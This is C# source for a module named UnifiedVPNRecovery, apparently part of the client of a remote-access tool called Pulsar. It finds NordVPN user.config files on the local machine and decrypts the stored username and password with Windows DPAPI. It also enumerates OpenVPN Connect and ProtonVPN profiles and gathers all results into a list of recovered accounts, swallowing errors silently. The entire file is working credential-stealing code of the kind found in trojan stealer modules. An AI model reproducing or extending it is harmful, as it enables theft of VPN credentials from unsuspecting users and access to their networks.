using Pulsar.Common.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Pulsar.Client.Recovery.VPN
{
    public static class UnifiedVPNRecovery
    {
        /// <summary>
        /// Decodes DPAPI protected data
        /// </summary>
        private static string Decode(string encodedData)
        {
            try
            {
                if (string.IsNullOrEmpty(encodedData))
                    return "";

                byte[] protectedData = Convert.FromBase64String(encodedData);
                byte[] decryptedData = ProtectedData.Unprotect(
                    protectedData,
                    null,
                    DataProtectionScope.LocalMachine);

                return Encoding.UTF8.GetString(decryptedData);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"VPN Decode Error: {ex.Message}");
                return "";
            }
        }

        /// <summary>
        /// Recovers NordVPN accounts
        /// </summary>
        public static void RecoverNordVPN(List<RecoveredAccount> output)
        {
            try
            {
                string nordVpnPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "NordVPN");

                if (!Directory.Exists(nordVpnPath))
                    return;

                foreach (DirectoryInfo versionDir in new DirectoryInfo(nordVpnPath).GetDirectories("NordVpn.exe*"))
                {
                    foreach (DirectoryInfo profileDir in versionDir.GetDirectories())
                    {
                        string userConfigPath = Path.Combine(profileDir.FullName, "user.config");
                        if (!File.Exists(userConfigPath))
                            continue;

                        XmlDocument doc = new XmlDocument();
                        doc.Load(userConfigPath);

                        string encodedUsername = doc.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
                        string encodedPassword = doc.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;

                        if (!string.IsNullOrEmpty(encodedUsername) && !string.IsNullOrEmpty(encodedPassword))
                        {
                            string username = Decode(encodedUsername);
                            string password = Decode(encodedPassword);

                            if (!string.IsNullOrEmpty(username))
                            {
                                output.Add(new RecoveredAccount
                                {
                                    Application = "NordVPN",
                                    Username = username,
                                    Password = password,
                                    Url = "vpn.nordvpn.com"
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"NordVPN Recovery Error: {ex.Message}");
            }
        }

        /// <summary>
        /// Recovers OpenVPN profiles
        /// </summary>
        public static void RecoverOpenVPN(List<RecoveredAccount> output)
        {
            try
            {
                string openVpnPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "OpenVPN Connect\\profiles");

                if (!Directory.Exists(openVpnPath))
                    return;

                foreach (string profileFile in Directory.GetFiles(openVpnPath, "*.ovpn"))
                {
                    output.Add(new RecoveredAccount
                    {
                        Application = "OpenVPN",
                        Username = Path.GetFileNameWithoutExtension(profileFile),
                        Password = "(Profile Configuration)",
                        Url = "vpn.openvpn.net"
                    });
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"OpenVPN Recovery Error: {ex.Message}");
            }
        }

        /// <summary>
        /// Recovers ProtonVPN configuration
        /// </summary>
        public static void RecoverProtonVPN(List<RecoveredAccount> output)
        {
            try
            {
                string protonVpnPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "ProtonVPN");

                if (!Directory.Exists(protonVpnPath))
                    return;

                foreach (string versionDir in Directory.GetDirectories(protonVpnPath, "ProtonVPN.exe*", SearchOption.AllDirectories))
                {
                    foreach (string profileDir in Directory.GetDirectories(versionDir))
                    {
                        string configPath = Path.Combine(profileDir, "user.config");
                        if (File.Exists(configPath))
                        {
                            output.Add(new RecoveredAccount
                            {
                                Application = "ProtonVPN",
                                Username = Path.GetFileName(profileDir),
                                Password = "(Configuration File)",
                                Url = "vpn.protonvpn.com"
                            });
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"ProtonVPN Recovery Error: {ex.Message}");
            }
        }

        /// <summary>
        /// Recovers all supported VPN clients
        /// </summary>
        public static void RecoverAllVPNs(List<RecoveredAccount> output)
        {
            RecoverNordVPN(output);
            RecoverOpenVPN(output);
            RecoverProtonVPN(output);
        }

        /// <summary>
        /// Recovers all VPN clients and returns as list
        /// </summary>
        public static List<RecoveredAccount> RecoverAllVPNs()
        {
            var recoveredAccounts = new List<RecoveredAccount>();
            RecoverAllVPNs(recoveredAccounts);
            return recoveredAccounts;
        }
    }
}